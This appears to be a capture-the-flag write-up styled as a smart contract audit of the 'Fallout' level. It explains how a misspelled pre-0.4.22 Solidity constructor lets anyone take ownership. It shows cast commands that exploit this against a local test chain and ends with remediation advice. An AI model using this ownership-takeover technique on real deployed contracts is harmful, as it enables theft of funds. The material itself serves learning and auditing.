## Smart Contract Security Audit: Level 02 - Fallout

## Executive Summary
The target contract `Fallout` was audited to identify potential attack vectors leading to an unauthorized change of contract ownership. A critical vulnerability was identified and exploited, allowing any arbitrary external actor to claim the `owner` role of the contract and compromise its security boundary.

---

## Vulnerability Analysis
### Broken Access Control via Misnamed Constructor
In Solidity versions prior to `0.4.22`, a contract's constructor was defined by creating a public function with the exact same name as the contract itself. 

During the implementation of the `Fallout` contract, a typographical error was introduced:
* **Contract Name:** `Fallout`
* **Function Name:** `Fal1out` (Contains a numeric `1` instead of a lowercase `l`).

---

Because the function name does not precisely match the contract name, the compiler treats `Fal1out()` as a standard, public, executable function rather than a constructor. 

```solidity
// Vulnerable Code Layout
contract Fallout {
    // ...
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[msg.sender] = msg.value;
    }
}
  
---
  
## Impact Assessment

 Severity: Critical

Consequences: The system initialization phase is exposed permanently at runtime. Any external address can invoke Fal1out() at any point in the contract's lifecycle to overwrite the owner state variable, hijacking administrative privileges instantly.

## Exploitation Proof of Concept (PoC)

Using the cast command-line utility, the public function was invoked by the player wallet address, passing a minimal value of 1 wei to satisfy execution requirements and claim ownership:
Bash

# Step 1: Call the misnamed function to seize ownership
cast send 0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6 "Fal1out()" --value 1 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

# Step 2: Verify the updated owner variable state
cast call 0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6 "owner()(address)" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

Result: The storage layout updated successfully, returning the player's address (0x70997970C51812dc3A010C7d01b50e0d17dc79C8) as the contract owner.

## Remediation & Best Practices

    Explicit Constructor Keyword: Upgrade the codebase to use modern Solidity versions (^0.8.0) that utilize the dedicated, explicit constructor keyword rather than function name matching:
    Solidity

    constructor() payable {
        owner = msg.sender;
    }

    Static Analysis Automation: Integrate linting and security frameworks like Slither or Mythril into local build and pre-commit pipelines to flag initialization naming discrepancies automatically.
